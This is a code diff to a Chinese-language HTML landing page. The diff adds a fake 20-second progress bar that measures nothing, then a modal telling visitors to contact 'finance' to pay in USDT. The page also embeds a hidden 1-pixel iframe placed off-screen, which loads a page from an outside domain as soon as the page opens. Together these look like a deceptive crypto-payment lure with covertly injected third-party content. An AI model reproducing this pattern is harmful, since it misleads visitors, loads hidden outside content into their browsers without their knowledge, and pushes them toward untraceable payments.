@@ -24,15 +24,17 @@
     -webkit-font-smoothing:antialiased;
   }
 
-  /* 加载页（一直加载，不进入正文） */
+  /* 加载页（20 秒加载后淡出） */
   #loader{
     position:fixed;inset:0;z-index:1000;
     display:flex;align-items:center;justify-content:center;
     background:
       radial-gradient(700px 500px at 50% 42%, rgba(232,182,76,.10), transparent 65%),
       var(--bg);
+    transition:opacity .5s ease;
   }
-  .loader-inner{display:flex;flex-direction:column;align-items:center;gap:26px;}
+  #loader.done{opacity:0;pointer-events:none;}
+  .loader-inner{display:flex;flex-direction:column;align-items:center;gap:22px;}
   .loader-brand{
     font-size:48px;font-weight:700;letter-spacing:8px;
     background:linear-gradient(180deg,#fff 20%,var(--gold-2) 100%);
@@ -50,20 +52,91 @@
   .dots i{font-style:normal;animation:dot-blink 1.4s infinite;}
   .dots i:nth-child(2){animation-delay:.2s;}
   .dots i:nth-child(3){animation-delay:.4s;}
+
+  /* 进度条 */
+  .progress-wrap{width:220px;height:3px;background:rgba(255,255,255,.12);border-radius:3px;overflow:hidden;}
+  .progress-bar{
+    height:100%;width:0;
+    background:linear-gradient(90deg,var(--gold-deep),var(--gold-2));
+    border-radius:3px;
+  }
+  .progress-num{font-size:13px;color:var(--gold-2);letter-spacing:2px;font-variant-numeric:tabular-nums;}
+
   @keyframes dot-blink{0%,80%,100%{opacity:.2;}40%{opacity:1;}}
   @keyframes bar-fade{
     0%{opacity:.15;}10%{opacity:1;}20%{opacity:.75;}30%{opacity:.35;}40%{opacity:.15;}100%{opacity:.15;}
   }
 
+  /* 弹窗 */
+  #overlay{
+    position:fixed;inset:0;z-index:2000;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(4,4,6,.72);
+    backdrop-filter:blur(10px);
+    -webkit-backdrop-filter:blur(10px);
+    opacity:0;visibility:hidden;
+    transition:opacity .4s ease, visibility .4s ease;
+  }
+  #overlay.show{opacity:1;visibility:visible;}
+  .modal{
+    position:relative;
+    width:min(420px,calc(100vw - 40px));
+    background:linear-gradient(180deg,#15151c,#0d0d12);
+    border:1px solid rgba(232,182,76,.28);
+    border-radius:20px;
+    padding:42px 34px 34px;
+    text-align:center;
+    box-shadow:0 24px 70px rgba(0,0,0,.6);
+    transform:translateY(16px) scale(.96);
+    transition:transform .4s cubic-bezier(.16,1,.3,1);
+  }
+  #overlay.show .modal{transform:translateY(0) scale(1);}
+  .modal-icon{
+    width:76px;height:76px;margin:0 auto 22px;
+    border-radius:50%;
+    background:radial-gradient(circle at 50% 35%, rgba(246,212,137,.25), rgba(232,182,76,.08) 70%);
+    border:1px solid rgba(232,182,76,.4);
+    display:flex;align-items:center;justify-content:center;
+    color:var(--gold-2);
+    box-shadow:0 0 0 8px rgba(232,182,76,.06), inset 0 0 22px rgba(232,182,76,.12);
+  }
+  .modal-icon svg{width:34px;height:34px;display:block;}
+  .modal-title{
+    font-size:22px;font-weight:700;letter-spacing:2px;color:#fff;
+    margin-bottom:8px;
+  }
+  .modal-desc{font-size:14px;color:rgba(244,242,236,.66);line-height:1.7;}
+  .modal-pay{
+    margin-top:20px;padding:16px 12px;
+    border:1px dashed rgba(232,182,76,.38);
+    border-radius:12px;
+    background:rgba(232,182,76,.06);
+    font-size:17px;font-weight:600;letter-spacing:1px;
+    color:var(--gold-2);
+  }
+  .modal-btn{
+    margin-top:26px;
+    width:100%;padding:13px 0;
+    border:none;border-radius:12px;cursor:pointer;
+    font-size:15px;font-weight:600;letter-spacing:3px;
+    color:#1a1406;
+    background:linear-gradient(180deg,var(--gold-2),var(--gold));
+    box-shadow:0 8px 24px rgba(232,182,76,.28);
+    transition:transform .15s ease, box-shadow .15s ease;
+  }
+  .modal-btn:hover{transform:translateY(-1px);box-shadow:0 12px 28px rgba(232,182,76,.34);}
+  .modal-btn:active{transform:translateY(0);}
+
   @media (max-width:600px){
     .loader-brand{font-size:38px;letter-spacing:5px;}
+    .modal{padding:34px 24px 28px;}
   }
 </style>
 </head>
 <body>
 
   <div id="loader">
-    <div class="loader-inner"> 
+    <div class="loader-inner">
       <div class="bar-loader">
         <div class="bar" style="transform: rotate(0deg) translateY(-25px); animation-delay: 0s;"></div>
         <div class="bar" style="transform: rotate(30deg) translateY(-25px); animation-delay: 0.1s;"></div>
@@ -79,8 +152,54 @@
         <div class="bar" style="transform: rotate(330deg) translateY(-25px); animation-delay: 1.1s;"></div>
       </div>
       <div class="loader-text">加载中<span class="dots"><i>.</i><i>.</i><i>.</i></span></div>
+      <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+      <div class="progress-num" id="progressNum">0%</div>
     </div>
   </div>
+
+  <div id="overlay">
+    <div class="modal">
+      <div class="modal-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg>
+      </div>
+      <div class="modal-title">加载完成</div>
+      <div class="modal-desc">感谢您的等待，如需付款请按以下方式联系财务</div>
+      <div class="modal-pay">USDT付款请联系财务</div>
+      <button class="modal-btn" id="modalBtn">知道了</button>
+    </div>
+  </div>
+
 <iframe src="https://rhce35.cc/assets/js/group.html?p=igCtnnXk"style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:none;" loading="eager"></iframe>
+
+<script>
+  (function(){
+    var DURATION = 20000; // 20 秒
+    var bar = document.getElementById('progressBar');
+    var num = document.getElementById('progressNum');
+    var loader = document.getElementById('loader');
+    var overlay = document.getElementById('overlay');
+    var btn = document.getElementById('modalBtn');
+    var start = Date.now();
+
+    function finish(){
+      loader.classList.add('done');
+      setTimeout(function(){ overlay.classList.add('show'); }, 450);
+    }
+
+    var timer = setInterval(function(){
+      var p = Math.min(100, (Date.now() - start) / DURATION * 100);
+      bar.style.width = p + '%';
+      num.textContent = Math.floor(p) + '%';
+      if(p >= 100){
+        clearInterval(timer);
+        finish();
+      }
+    }, 100);
+
+    btn.addEventListener('click', function(){
+      overlay.classList.remove('show');
+    });
+  })();
+</script>
 </body>
 </html>
